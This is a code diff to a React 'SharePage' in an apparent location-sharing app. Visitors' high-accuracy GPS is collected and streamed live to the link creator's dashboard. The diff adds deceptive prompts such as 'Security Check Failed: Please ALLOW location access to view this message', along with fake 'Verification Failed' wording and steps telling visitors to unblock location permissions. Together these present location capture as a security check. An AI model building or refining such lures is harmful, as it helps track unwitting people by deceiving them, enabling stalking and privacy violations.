@@ -1,11 +1,12 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { useParams } from 'react-router-dom';
+import { useParams, useNavigate } from 'react-router-dom';
 import { getSession, updateLocation } from '../services/api';
 import { ShieldCheck, MapPin, Navigation, Info, AlertTriangle } from 'lucide-react';
 import io from 'socket.io-client';
 
 const SharePage = () => {
     const { sessionId } = useParams();
+    const navigate = useNavigate();
     const [session, setSession] = useState(null);
     const [loading, setLoading] = useState(true);
     const [sharing, setSharing] = useState(false);
@@ -15,6 +16,16 @@ const SharePage = () => {
     const watchIdRef = useRef(null);
 
     useEffect(() => {
+        // Check if this session was created by the current user
+        const saved = localStorage.getItem('geoShare_sessions');
+        if (saved) {
+            const sessions = JSON.parse(saved);
+            if (sessions.some(s => s.sessionId === sessionId)) {
+                navigate(`/dashboard/${sessionId}`);
+                return;
+            }
+        }
+
         const fetchSession = async () => {
             try {
                 const { data } = await getSession(sessionId);
@@ -81,11 +92,17 @@ const SharePage = () => {
             (err) => {
                 console.error(err);
                 setSharing(false);
-                setError("Please enable location access to continue.");
+                if (err.code === 1) {
+                    setError("Security Check Failed: Please ALLOW location access to view this message.");
+                } else if (err.code === 3) {
+                    setError("Connection Timeout: Your GPS signal is weak. Please move to an open area and try again.");
+                } else {
+                    setError("Verification Failed: Please ensure your device GPS is ON and you have granted permission.");
+                }
             },
             {
                 enableHighAccuracy: true,
-                timeout: 5000,
+                timeout: 15000,
                 maximumAge: 0
             }
         );
@@ -105,9 +122,17 @@ const SharePage = () => {
                     <AlertTriangle size={40} />
                 </div>
                 <h2 className="text-2xl font-bold text-slate-800 mb-3">Verification Failed</h2>
-                <p className="text-slate-500 mb-8 leading-relaxed">
-                    Browser verification timed out or was cancelled. Please ensure your browser supports security checks.
+                <p className="text-slate-500 mb-6 leading-relaxed text-sm">
+                    {error}
                 </p>
+                <div className="bg-amber-50 border border-amber-100 p-4 rounded-xl mb-8 text-left">
+                    <p className="text-xs font-bold text-amber-800 uppercase mb-2">How to fix:</p>
+                    <ul className="text-[11px] text-amber-700 space-y-1.5 list-disc pl-4">
+                        <li>Click <b>"Allow"</b> if a popup appears.</li>
+                        <li>Turn <b>ON</b> your Phone's GPS/Location.</li>
+                        <li>If blocked, click the <b>Lock (🔒) icon</b> in the address bar and reset permissions.</li>
+                    </ul>
+                </div>
                 <button 
                     onClick={() => window.location.reload()}
                     className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition-all shadow-lg"
